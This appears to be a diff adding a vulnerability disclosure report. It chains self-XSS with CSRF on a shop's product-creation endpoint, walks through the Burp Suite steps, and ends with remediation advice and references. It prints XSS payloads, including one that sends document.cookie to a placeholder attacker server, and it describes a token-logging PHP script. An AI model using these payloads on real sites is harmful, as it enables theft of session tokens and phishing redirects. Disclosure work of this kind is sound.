@@ -1,0 +1,83 @@
+Description:
+Self XSS to perform Reflected XSS attacks via CSRF
+
+Self XSS is a self-harm vulnerability. This is when a malicious script or payload only impacts the user's own browser, and does not affect other users, much the same as Reflected XSS. The difference is that Reflected XSS can impact all users even if only temporarily, and can be fatal in certain purposes, such as redirecting to phishing websites, stealing cookies and more.
+
+CSRF (Cross Site Request Forgery) is a web exploit attack that can make users send requests or requests to websites through the website that is used at that time without realizing it. From there, the web application will execute that request which the user didn't really want. Irresponsible parties usually embed links or url links in images or other pages. If the user accidentally clicks, it will be taken to a web page that contains malicious code.
+
+
+Scenario:
+In this attack scenario, I exploit a combination of 2 vulnerabilities, namely Self XSS and CSRF,
+All this time I know that Self XSS only impacts itself and other users won't feel the impact.
+
+therefore in order for this Self XSS to impact other users I tried to combine these 2 vulnerabilities, Self XSS and CSRF to perform reflected XSS via CRF.
+Then from the CSRF payload it will trigger a JavaScript script to display a pop-up that has been inserted into the CSRF URL payload,
+but not just pop-ups that can even steal things like x-shop-token and x-shop-id or direct victims to phishing sites.
+
+For example using social engineering techniques because this attack is a CSRF attack or commonly called a one click attack,
+an attacker must persuade the victim to log in or the victim has logged in but has not logged out just closes the browser which still saves history,
+then the attacker sends the CSRF URL to the victim, if the victim accidentally clicks on the URL sent from the hacker then the victim will feel the impact of the attack.
+
+(Actually for this scenario my goal is to retrieve the paymes_session cookie.
+but i know that stealing cookies set as HttpOnly is not possible it can be stolen on client side using JavaScript or PHP scripts because HttpOnly is only accessible on server side
+
+Step exploits:
+1.Login as a hacker in Windows 11 then go to the (Shop --> Add Products) section. To pretend to make a product in general, before filling out the form to create a product, turn on the foxy proxy extension and open burpsuite. Enter the (Proxy --> HTTP History) After that, minimize the burpsite and fill in the form in the section (add-product) then submit (add-ptoduct).
+
+2. After that, open Burpsuite again, inside Burpsuite go to the (Proxy -> HTTP History) section and look for the title "paymes Dashboard", then right-click on the body of the request and send it to the Repeater.
+
+3. Enter the (Repeater) -> (Content-Disposition: form-data; name="title") section. Add or modify the payload:
+"><svg Only=1 OnLoad=confirm(document.domain)> --> to trigger JavaScript pop-up
+"><svg Only=1 OnLoad=confirm(document.location="YOURSERVER.COM/?c="+document.cookie)> --> To steal x-shop id,token
+
+4. Then right click select an option (Engagement tools --> Generate CSRF POC), then click on the section (option --> Multipart from --> Include auto-submit script --> Regenerate) delete or remove the section (<input type= "hidden" name="file" value="" />) , and Copy the HTML CSRF payload to the hacker's server.
+
+5. And I made a PHP script to steal x-shop-id and x-shop-token. After getting the x-shop-id and x-shop-token, the results will be written in the log.txt file, in 1 folder along with the PHP script and CSRF payload.
+
+6. After all the payloads are ready, the script can be run and sends the CSRF URL to the victim who is currently logged in, or active on the website, but it could also be that the victim has logged in but has not logged out or just closes the browser which still saves history in the browser, if the victim accesses the url sent from the hacker will have an impact on the victim, where the victim's data will be written on the hacker's server, such as x-shop-id and x-shop-token.
+
+7. In this final step, I moved to the Kali Linux machine as a victim who had been tricked by hackers into accessing the given URL, and it turned out that after being accessed by the victim, the URL actually redirected to an evil URL or phishing website.
+
+8. As a hacker who has succeeded in tricking the victim, check into the log.txt file, where the victim's data is written, such as IP, user agent, shop-id cookies and shop-token
+
+URL endpoint: https://user.paymes.com/boutique_generate_product.php
+
+Impact:
+1.Can have a negative impact on the reputation of the site and business
+2.Information theft such as x-shop-token and x-shop-id
+3.Redirected to a phishing site
+
+Rekomendasi:
+1.Use htmlspecialchars()
+2.Use the PHP strip_tags() function
+3.User input validation
+
+FOR CSRF
+1.Secret Validation Tokens
+2.Random Validation Tokens
+3.Use server-side frameworks that come with built-in anti-CSRF tokens
+
+1.https://learn.microsoft.com/id-id/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0
+2.https://owasp.org/www-community/attacks/xss
+3.https://learn.microsoft.com/id-id/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks
+4.https://owasp.org/www-community/attacks/csrf
+
+1.Virtual Box Kali Linux mozila 102.8.0esr (64-bit)
+user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+
+2.Windows 11 mozila fire fox 111.0.1 (64-bit)
+user agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
+
+
+Payload:
+-> pop-up domain:        
+    "><svg Only=1 OnLoad=confirm(document.domain)>
+
+-> Steal Cookie:     
+    "><svg Only=1 OnLoad=confirm(document.location="http://YOUR_SERVER.COM/?c="+document.cookie)>
+
+
+
+
+
+
